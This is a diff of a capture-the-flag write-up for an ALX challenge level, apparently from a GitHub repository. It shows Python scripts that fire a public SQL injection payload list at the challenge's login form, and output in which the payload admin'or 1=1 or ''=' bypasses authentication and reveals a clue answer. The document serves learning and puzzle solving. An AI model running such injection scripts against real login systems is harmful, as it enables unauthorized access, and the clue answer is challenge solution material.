@@ -312,25 +312,54 @@ I went on google to find a `list of SQL Injection payloads` and I grabbed the fi
 
 The [SQL Injection Payload List](https://github.com/payloadbox/sql-injection-payload-list) repo had a list of different kinds of injection attacks
 
-I then copy the first list that was labeled `Generic SQL Injection Payloads` and save it to a file called `payloads-1.txt` in my working directory
+I then copy the first list that was labeled `Generic SQL Injection Payloads`, removed the comments and save it to a file called `payloads-1.txt` in my working directory
 
-I then use the network debugger inside developer tools to remake the request (I'm using Firefox here, so its easy to edit and resend requests, for those using chrome-based browsers you can use API Testing chrome extensions like `JaSON` or `Talend API Tester`)
+I then use the network debugger inside developer tools to remake the request (I'm using Firefox here, so its easy to edit and resend requests, for those using Chrome-based browsers you can use API Testing chrome extensions like `JaSON` or `Talend API Tester`)
 
-![]()
+Open Developer tools by pressing `Ctrl + Shift + I` and navigate to the `Network tab` and enable network log persitance (Persist Logs in Firefox and Preserve Log in Chrome)
 
+![Level 7 Devtools](./assets/img/level7-devtools.jpg)
+
+We then make a request to the server. I made a request with a username of `test` and I left the password field empty, when I clicked on the Login button
+some requests got logged
+
+![Logged Requests](./assets/img/logged-requests.jpg)
+
+The one we are interested in is, the first request which has a status code `200 OK`, it's also a `POST` request, which is most of the time used to send data to the server, the request headers and request payloads are as follows
+
+![Level 7 Headers](./assets/img/level7-headers.jpg)
+
+![Level 7 Request Payload](./assets/img/level7-request_payload.jpg)
+
+Combining all this into a python script, we get the following, the reason I have used the `aiohttp` library instead of the usual `requests` is because I was expecting to make requests of the entire SQL Injection Payloads List, we saw earlier and with that scale requests is very slow
+
+First install aiohttp and libraries that improve the performance
+
+```sh
+sudo pip install aiohttp aiodns cchardet
+```
+
+The python script I saved it as `venicodivici.py`
 
 ```py
 #!/usr/bin/python3
+
+# Import standard library for asynchronous input
+# It's actually important because we need an event loop
+# that will run our courotines (asynchronus functions)
 import asyncio
+# Import an asynchronus library for making requests and creating
+# servers (much like flask, but async)
 import aiohttp
 
-# read the payloads file and store as a a list in
+# read the payloads file and store result as a list in
 # the variable lines
 with open('payloads-1.txt') as f:
-    lines = f.readlines()
+    sql_payloads = f.readlines()
 
 url = "http://venicodivici.co/identification.php"
 
+# The necessary request headers for the request to succeed
 headers = {
         "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
@@ -338,23 +367,97 @@ headers = {
         "Content-Type": "application/x-www-form-urlencoded"
     }
 
-def parse(content, left, right, li = 1, ri = 0):
-    value = str(content.split(left)[li].split(right)[ri])
-    return value
-
-async def r(session, i):
-    data = f"submitted=1&username=%{i}&password="
-    async with session.post(url, headers = headers, data = data) as resp:
+async def request_maker(session, sql_payload):
+	# prepare payload
+    request_payload = f"submitted=1&username={sql_payload}&password="
+    async with session.post(url, headers = headers, data = request_payload) as resp:
+            # when awaiting or waiting for the response to come, other coroutines can run
+            # during that waiting time
             res = await resp.text()
-            print(f"{i} <>>> {res}")
+            # print the payload and html response
+            print(f"{sql_payload} <>>> {res}")
 
 async def main():
+	# Create a list to hold our coroutines
     l = []
+    # Create a request session object, which allows us to utilize
+    # the same session, cookies and keeps connection alive
     async with aiohttp.ClientSession() as session:
-        for i in d:
-            l.append(r(session, i))
+    	# Prepare and store all coroutines that will perform the sql injection
+        for sql_payload in sql_payloads:
+            l.append(request_maker(session, sql_payload))
+        # the gather method allows any available coroutines to run when there is
+        # an awaitable (something that waits for something)
         await asyncio.gather(*l)
-
+# Get an event loop and run the coroutine: main
 asyncio.run(main())
 
 ```
+
+For anyone interested in the requests version, here it is as follows
+
+```py
+#!/usr/bin/python3
+
+# Import a synchronous request library
+import requests
+
+# read the payloads file and store result as a list in
+# the variable lines
+with open('payloads-1.txt') as f:
+    sql_payloads = f.readlines()
+
+url = "http://venicodivici.co/identification.php"
+
+# The necessary request headers for the request to succeed
+headers = {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.5",
+        "Content-Type": "application/x-www-form-urlencoded"
+    }
+
+def request_maker(sql_payload):
+	# prepare payload
+    request_payload = f"submitted=1&username={sql_payload}&password="
+    # Make a post request to sever
+    resp = requests.post(url, headers = headers, data = request_payload)
+    # Parse text response from server
+    res = resp.text           
+    # print the payload and html response
+    print(f"{sql_payload} <>>> {res}")
+
+def main():
+    for sql_payload in sql_payloads:
+        request_maker(sql_payload)
+
+if __name__ == '__main__':
+	main()
+
+```
+
+After running the script, this is the result I got that
+
+```sh
+python venicodivici.py
+...
+admin" or 1=1/*
+ <>>> <center>Wrong password. Try again.<br /><img src="images/nop.png" /></center>
+admin' or 1=1--
+ <>>> <center>You are onto something...<br /><img src="images/injection.png" /></center>
+admin'or 1=1 or ''='
+ <>>> <center>Welcome, H4ck3R! Clue #3 for the last level "Are you clueless" is "baguette" (lower case)<br />Time to brag on Twitter!!          <a href="https://twitter.com/intent/tweet?ref_src=twsrc%5Etfw" class="twitter-hashtag-button"
+        data-text="I have found @alx_africa #ALXchallenge2022 clue #3 (needed for the last level) \o/
+THANK YOU @karoub, @guillaumesalva, @gautie_a, @julienbarbier42, @0xAuntyBetty and @FredSwaniker! This one was tough and fun! #dohardthings"
+                 data-show-count="true">Tweet</a>
+  <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
+        <br />
+        <br />
+<img src="images/hacker.png" /></center>
+...
+```
+So our SQL payload password becomes `admin'or 1=1 or ''='`, we can also see we found clue 3, which is `baguette`, but for those who still would like to see what it looks like in the browser here it is (entering it on either the username, password field or both fields works fine)
+
+![Clue 3](./assets/img/baguette.jpg)
+
+That was all for clue 3, thank you for reading thus far my friend
